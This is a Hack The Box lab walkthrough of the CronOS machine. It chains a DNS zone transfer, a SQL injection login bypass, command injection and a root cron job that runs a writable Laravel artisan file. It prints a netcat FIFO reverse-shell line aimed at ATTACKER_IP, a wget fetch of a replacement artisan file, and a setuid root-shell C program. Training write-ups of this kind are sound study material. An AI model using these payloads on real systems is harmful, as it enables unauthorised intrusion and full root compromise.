---
title: "CronOS"
description: "Hack The Box CronOS walkthrough covering enumeration, web exploitation and privilege escalation."
category: "Hack The Box"
date: "2021-09-16"
tags:
  - "Hack The Box"
  - "Linux"
  - "Web"
  - "Privilege Escalation"
status: "PUBLISHED"
---

# CronOS

> **LAB ENVIRONMENT** — This writeup documents security testing performed against the Hack The Box CronOS machine in an intentionally vulnerable training environment.

## Overview

CronOS is a Linux-based Hack The Box machine that demonstrates how several weaknesses can be chained together to obtain full system compromise.

The attack path involved:

```text
Service Enumeration
        ↓
Virtual Host Discovery
        ↓
DNS Zone Transfer
        ↓
Administrative Application Discovery
        ↓
SQL Injection Authentication Bypass
        ↓
Command Injection
        ↓
Initial Shell
        ↓
Cron Job Enumeration
        ↓
Writable Laravel Artisan File
        ↓
Root Execution
```

## Enumeration

Initial enumeration was performed with Nmap to identify the exposed attack surface.

![Initial Nmap enumeration](/writeups/cronos/nmap.png)

The target exposed web functionality and DNS services that became important during later enumeration.

## Web Enumeration

Browsing directly to the target initially returned the default Apache page.

![Default Apache site](/writeups/cronos/website.png)

Further investigation indicated that the application expected requests for the `cronos.htb` virtual host rather than the target IP directly.

The hostname was added to the local hosts file:

```bash
sudo nano /etc/hosts
```

```text
10.10.10.13 cronos.htb
```

Requests could then be sent using the expected hostname.

During manual testing, the `Host` header could also be modified through Burp Suite:

```text
Host: cronos.htb
```

![CronOS web application](/writeups/cronos/cronos_site.png)

## DNS Enumeration

DNS was exposed on the target and was investigated for additional hostnames.

Using `nslookup`, the target was configured as the DNS server:

```bash
nslookup
```

```text
server 10.10.10.13
```

Reverse lookup identified:

```text
ns1.cronos.htb
```

Querying the primary domain confirmed:

```text
cronos.htb
```

A DNS zone transfer was then attempted:

```bash
dig axfr @10.10.10.13 cronos.htb
```

![DNS zone transfer](/writeups/cronos/ZoneTransfer.png)

The zone transfer exposed additional hosts, including:

```text
admin.cronos.htb
ns1.cronos.htb
```

These hostnames were added to `/etc/hosts` for further testing.

```text
10.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb
```

The exposed `admin.cronos.htb` host presented an administrative login interface.

![CronOS administrative login](/writeups/cronos/cronos_admin_page.png)

## Authentication Testing

The administrative login was tested for SQL injection.

One approach was to capture the login request in Burp Suite, save the request, and provide it to SQLMap for additional testing:

```bash
sqlmap -r login.req
```

Manual authentication bypass was also tested using an SQL comment sequence.

Example:

```text
Username: admin'-- -
Password: <arbitrary value>
```

The crafted username successfully bypassed authentication and provided access to the administrative functionality.

## Command Injection

After authentication, application functionality was identified that accepted network-related input.

Testing demonstrated that operating system commands could be appended to the supplied value.

![Command injection](/writeups/cronos/command_injection.png)

The request was also inspected and modified through Burp Suite.

![Command injection captured in Burp Suite](/writeups/cronos/burp_command_injection.png)

Successful command execution confirmed that user-controlled input was being passed to the underlying operating system without sufficient validation.

## Initial Foothold

Command injection was then used to obtain an interactive shell on the target.

The original lab notes used a FIFO-based shell payload through the vulnerable input:

```bash
8.8.8.8; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

A listener was started on the attacking system before triggering the request.

Successful execution resulted in an initial shell on the CronOS host.

![Initial foothold](/writeups/cronos/foothold.png)

Basic system enumeration confirmed the target was running Linux:

```bash
uname -a
```

Example output from the lab:

```text
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 GNU/Linux
```

The shell was upgraded using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation Enumeration

With a foothold established, process monitoring was performed using `pspy`.

```bash
./pspy
```

The output revealed a recurring command being executed as UID `0`:

```text
UID=0 | /bin/sh -c php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

This was significant because the Laravel `artisan` file was located within a directory accessible from the compromised account.

The relevant directory was:

```bash
cd /var/www/laravel/
```

The original `artisan` file was preserved:

```bash
mv artisan artisan_orig
```

The observation created a straightforward privilege escalation path:

```text
Writable artisan file
        ↓
Scheduled task executes artisan
        ↓
Task runs as UID 0
        ↓
Attacker-controlled PHP executes as root
```

## Root Execution

A replacement `artisan` file was prepared on the attacking system.

The original notes used PHP command execution to trigger a callback. The executable reverse-shell body has been omitted from the public copy:

```php
<?php
// Example only: reverse-shell style command omitted
exec("/bin/bash -c '<REVERSE_SHELL_COMMAND_REDACTED>'");
```

A temporary HTTP server was started:

```bash
python3 -m http.server 8000
```

A listener was also prepared:

```bash
nc -nlvp 1337
```

The replacement file was downloaded onto the target:

```bash
wget http://ATTACKER_IP:8000/artisan
mv artisan /var/www/laravel/
```

When the scheduled task next executed `artisan`, the attacker-controlled file ran with root privileges.

![Root access](/writeups/cronos/60831558-c9a3-40fa-9be0-e7b16b82bd29.png)

This resulted in complete compromise of the target.

## Key Observations

Several weaknesses contributed to the compromise:

- DNS zone transfer exposed internal hostnames.
- An administrative application was discoverable through virtual-host enumeration.
- The administrative login was vulnerable to SQL injection.
- Authenticated functionality was vulnerable to operating system command injection.
- Command injection provided an initial foothold.
- A root-owned scheduled task executed a writable application file.
- Modification of that file resulted in root-level command execution.

No single stage represented the entire compromise. The machine was compromised by chaining multiple weaknesses across network services, web application functionality and local privilege boundaries.

## Attack Path

The complete observed attack path was:

```text
[ CRONOS ]
    │
    ▼
Nmap Enumeration
    │
    ▼
Apache / DNS Identified
    │
    ▼
cronos.htb Virtual Host
    │
    ▼
DNS Zone Transfer
    │
    ├── admin.cronos.htb
    └── ns1.cronos.htb
    │
    ▼
Administrative Login
    │
    ▼
SQL Injection Authentication Bypass
    │
    ▼
Command Injection
    │
    ▼
Initial Linux Shell
    │
    ▼
pspy Process Monitoring
    │
    ▼
Root Cron Job Identified
    │
    ▼
Writable Laravel artisan File
    │
    ▼
Scheduled Root Execution
    │
    ▼
ROOT
```

## Additional Notes

A few additional commands were retained from the original working notes.

Finding Laravel-related files:

```bash
find / -name Kernel.php 2>/dev/null
```

The original notes also explored creating a SUID helper binary as an alternate persistence or privilege mechanism:

```c
int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

Compilation example:

```bash
gcc setuid.c -o cybernights
```

A simple Python web server could then be used to transfer the binary into the lab environment:

```bash
python3 -m http.server 8000
```

These commands were not required for the primary CronOS compromise path and are retained only as supplementary lab notes.

## Conclusion

CronOS demonstrates the value of methodical enumeration and attack-path correlation.

The initial Apache page did not expose the real application directly. DNS enumeration and a successful zone transfer revealed additional virtual hosts, including an administrative interface.

Weak authentication controls then allowed access to application functionality vulnerable to command injection, resulting in an initial shell.

Local process monitoring identified the final privilege escalation vector: a root-executed Laravel scheduled task referencing a file that could be replaced by the compromised user.

The key lesson from CronOS is the importance of following evidence from one layer into the next:

**network enumeration → application discovery → authentication bypass → command execution → local enumeration → privilege escalation.**